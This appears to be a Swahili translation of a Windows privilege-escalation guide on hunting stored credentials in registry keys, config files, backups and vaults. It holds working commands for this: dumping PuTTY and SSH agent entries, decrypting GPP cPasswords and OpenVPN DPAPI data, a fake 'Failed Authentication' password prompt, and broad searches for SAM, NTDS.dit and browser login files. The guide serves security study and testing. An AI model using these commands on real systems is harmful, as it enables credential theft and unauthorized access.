Installers **huendeshwa kwa SYSTEM privileges**, nyingi zinaathiriwa na **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Mabaki ya credentials kwenye registry ya zana za usaidizi

Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na nywila chini ya funguo maalum za registry za programu. Kwa mfano, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya kipindi iliyosanidiwa katika matoleo ya kabla ya 9. Alama ya jina la thamani ni kidokezo tu cha kuanza ukaguzi: hakiki toleo lililosakinishwa, data ya thamani inayoweza kusomwa, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka nywila ya usaidizi wa mbali hadi akaunti ya Windows yenye ruhusa za juu zaidi kunahitaji pia uthibitisho wa matumizi halisi ya nywila hiyo tena na idhini ya kutumia akaunti hiyo. Usionyeshe maandishi fiche au nywila zilizopatikana katika matokeo ya kawaida ya uorodheshaji.

### Lahajedwali zinazoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku kuwa kitabu cha kazi kinachoweza kusomwa kinachoshirikiwa kina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa laha ya kazi au safu zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa laha ya kazi hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya kitabu cha kazi yamesimbwa kwa njia fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na uepuke kuchapisha siri zinazoweza kuwepo wakati wa uorodheshaji mpana. Njia ya `.xlsx` inayoweza kusomwa, laha iliyolindwa au safu iliyofichwa pekee haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina ruhusa za juu zaidi; hakiki data halisi na haki za sasa za akaunti kando.

### Patches za mabadiliko zilizohifadhiwa na seva ya CI

Seva ya CI inaweza kuhifadhi mabadiliko ya msimbo chanzo yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaandika](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` huhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayoweza kusomwa inaweza kuhifadhi marejeleo yaliyoondolewa au kuongezwa kwa faili ya credential, ufunguo wa usimbaji fiche au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell ya `ConvertTo-SecureString -Key` inahitaji ufunguo wa AES pamoja na mfuatano uliosimbwa kwa njia fiche; [Microsoft inaandika](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa pekee mwanzoni, kisha kagua maudhui yanayohusika kwa idhini bila kuchapisha siri katika matokeo ya kawaida ya uorodheshaji. Njia ya patch, thamani iliyosimbwa kwa njia fiche au rejeleo la ufunguo pekee havithibitishi credential halali au ufikiaji wenye ruhusa za juu zaidi. Zuia ufikiaji wa ACL za saraka ya data na uepuke kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila za msimamizi wa ndani

Kibadilisha nywila kilichotengenezwa kienyeji kinaweza kuhifadhi nywila iliyosimbwa kwa njia fiche ya msimamizi wa ndani katika huduma ya ndani huku credentials za datastore zikihifadhiwa kwenye faili ya `.env` inayoweza kusomwa au karibu na binary ya updater. Kagua pamoja scheduled task ya updater, akaunti, ACL za usanidi, listener na ruhusa za datastore. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani aliye na credentials halali, lakini uthibitishaji peke yake hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au nyenzo za ufunguo zinapatikana karibu na maandishi yaliyosimbwa kwa njia fiche, hakiki utokaji halisi wa ufunguo kabla ya kuamini usimbaji huo. Mbinu inayotengeneza ufunguo wa AES kwa utaratibu kutoka kwa seed iliyofichuliwa kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda nywila hiyo; Go inaandika kuwa kifurushi hicho hakifai kwa nambari nasibu zinazohitaji usalama. Thibitisha kuwa nywila yoyote iliyopatikana bado ni ya sasa na ni ya akaunti iliyo katika kikundi cha Administrators cha ndani kabla ya kuichukulia kama njia ya kuongeza ruhusa. Scheduled task, njia ya `.env` au blob iliyosimbwa kwa njia fiche peke yake haithibitishi masharti hayo. Usionyeshe nywila na nyenzo za ufunguo katika matokeo ya kawaida ya uorodheshaji.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za wasimamizi wa ndani. Hifadhi yake inayotumia directory au Entra pamoja na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index maalum.

### JAR za plugin za seva ya Java na matumizi tena ya credentials

Baadhi ya plugin za seva za Java husambazwa kama archive za JAR katika saraka ya `plugins` ya seva. Plugin maalum inayoweza kusomwa inaweza kuwa na usanidi au bytecode iliyopachikwa credential ya huduma. Kagua archive hiyo kwa idhini pekee na usionyeshe siri zilizopatikana katika matokeo ya kawaida ya uorodheshaji. Njia ya plugin pekee haithibitishi kuwa kuna siri, na nywila ya huduma iliyopatikana husababisha ruhusa za juu zaidi tu ikiwa pia ni halali kwa akaunti yenye ruhusa za juu zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumika tena kwa siri tofauti. Tazama [mwongozo wa PaperMC wa kusakinisha plugin](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [nyaraka za Oracle za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kuhusu maudhui ya archive.

### Credentials za hifadhidata iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia hifadhidata yake iliyopachikwa unaweza kuwa na `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua pamoja rekodi za `OFUSER` na sifa ya `passwordKey`. [Nyaraka za Openfire za user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa nywila zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa kwa njia fiche kwa ufunguo uliohifadhiwa kwenye sifa hiyo. Nywila iliyopatikana ni muhimu kwa kuongeza ruhusa tu ikiwa bado ni halali kwa utambulisho wenye ruhusa za juu zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credentials. Njia hiyo ni kidokezo cha uorodheshaji, kwa hivyo usionyeshe maudhui ya hifadhidata na credentials katika matokeo ya kawaida ya uorodheshaji.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua porti na interface ya bind iliyosanidiwa kwa kiweko cha msimamizi hata kama hifadhidata ya nje inatumika. Openfire kwa kawaida hufunga kiweko cha msimamizi kwenye loopback; hata hivyo, akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inaendesha. Kagua kwa pamoja listener halisi, role ya msimamizi iliyoidhinishwa, sera ya kupakia plugin na utambulisho wa huduma ya Openfire. Msimamizi anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kuendeshwa katika muktadha wa huduma, ambao unaweza kuwa na ruhusa za juu sana ikiwa huduma inaendeshwa kama LocalSystem. Nywila ya akaunti inayolingana au njia ya usanidi inayoweza kusomwa pekee haithibitishi ufikiaji wa kiweko cha msimamizi au utekelezaji wa msimbo. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [sifa ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva za Velociraptor, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, anaweza kutengeneza cheti cha mteja cha API. Ikiwa hilo litasababisha ruhusa za juu zaidi hutegemea roles za watumiaji wa seva, ufikiaji wa API na utambulisho ambao seva au agent lengwa inaendeshwa nao. Usanidi wa mteja una nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya usambazaji huhifadhi ufunguo binafsi wa CA nje ya mtandao, kwa hiyo usanidi wa seva unaoweza kusomwa unaweza pia kukosa ufunguo wa kusaini.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** katika saraka yake ya usakinishaji na nakala zozote za chelezo zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha ufunguo binafsi kwenye logs au matokeo ya uorodheshaji. Workflow ya vendor ya `config api_client` hutumia ufunguo wa CA kutoa cheti cha mteja, lakini role inayofaa upande wa seva pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika kwenye datastore au kuwasha upya huduma. Utambulisho wa seva uliopo wenye ruhusa za juu unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. Maswali ya API yenye ruhusa za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa za juu sana.

Linda usanidi wa seva na nakala za chelezo kwa ACL zenye vizuizi, hifadhi ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza roles za API pamoja na ufikiaji wa listener. Tazama [nyaraka za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Credentials za PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake ya asili iliyosimbwa kwa njia fiche inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa ikiweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa uhamishaji wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa data inayohamishwa husimbwa kwa nenosiri na inaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi ya asili. Kagua ruhusa za faili na njia kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake, wala hakuthibitishi kuwa credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu zaidi.

### Funguo za Host za SSH za PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa registry `HKCU\Software\OpenSSH\Agent\Keys`, kwa hiyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda ni ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa njia fiche lakini unaweza kufumbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kutengeneza baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji kwa kutumia funguo zisizolingana.

### Faili za unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Hifadhi rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Kipaumbele kiwe saraka za backup au image zinazoweza kufikiwa ndani ya kifaa, na kagua **majina ya vipengee** vya image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuka, na faili za kawaida za `install.wim`, `boot.wim`, na image za recovery mara nyingi huwa njia za kupotosha. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya upeo wa kazi. Angalia mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, nenosiri ndani ya GPP hizi, lililosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliokuwa umeandikwa hadharani, lingeweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kuchanganua faili za GPP zilizohifadhiwa kwenye cache ya ndani na zenye sehemu ya "cpassword" isiyo tupu. Faili kama hiyo inapopatikana, kazi hiyo husimbua nenosiri na kurudisha object maalum ya PowerShell. Object hii ina maelezo kuhusu GPP na mahali ilipo faili, na kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata manenosiri:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup archives in an IIS webroot

Jalada la zamani la chelezo la ZIP lililowekwa moja kwa moja kwenye webroot inayotolewa kupitia seva linaweza kufichua faili za usanidi za awali na credentials zinazoweza kutumika tena. Kagua njia halisi iliyosanidiwa ya tovuti na uhakikishe kama jalada hilo linaweza kufikiwa kupitia HTTP kabla ya kulichukulia kuwa ni kufichuka kwa taarifa. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni eneo la kuchunguza tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa wa faili bila kufungua majalada:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la jalada halithibitishi kuwa lina siri au kwamba credential iliyopatikana inatoa ruhusa za juu zaidi.

### Vitambulisho vya OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **daima kumuomba mtumiaji aweke credentials zake, au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** zake ni **hatari sana**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na taarifa za uthibitishaji**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **manenosiri** katika **maandishi ya wazi** au Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Lahaja ya orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kuwa huenda ni vault iliyosimbwa kwa njia fiche; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua au kutumia credentials zozote zilizohifadhiwa. Unapokagua mahali faili hizo zimehifadhiwa, angalia profaili za watumiaji unazoweza kufikia na mizizi ya kushiriki faili iliyosanidiwa.

Faili ya KeePass `.kdbx` inayosomeka nayo ni kidokezo tu cha vault iliyosimbwa kwa njia fiche. Ili kuifungua, unahitaji master-password halisi na faili yoyote ya key au vipengele vya akaunti vilivyosanidiwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya LM:NT hash kwenye ingizo, thibitisha akaunti iliyotajwa na kama NT hash ni ya sasa na inakubaliwa na huduma ya NTLM ya lengo kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault lenyewe halikupi haki za Administrator au SYSTEM; ufikiaji wa huduma za mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia viwepo. Orodha ya mali inapaswa kuripoti njia ya vault na ikiwa inasomeka, si kuchapisha hifadhidata au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials ndani ya RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta credentials ndani yake

Kagua maingizo ya Recycle Bin yaliyofutwa unayoweza kufikia, ukitafuta nakala rudufu na kumbukumbu za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja wazi credentials. Nakala rudufu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake la `$R` linalolingana; kagua metadata na ruhusa za utambulisho wa sasa za kusoma kabla ya kufungua kumbukumbu. Kuonekana hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kwamba hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kiashiria cha kuchunguza, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za mchapishaji za AppLocker hutathmini utambulisho wa msaini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali saini itakayopatikana kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye ruhusa za juu zaidi iendeshe script hiyo kwa kweli. Jina la faili la `.pfx`, mada ya cheti, au script inayoweza kuandikwa pekee havithibitishi mnyororo huo. Kagua metadata, ACLs, sera, na amri ya scheduled task kabla ya kufungua nyenzo za private key au kuanzisha task hiyo.

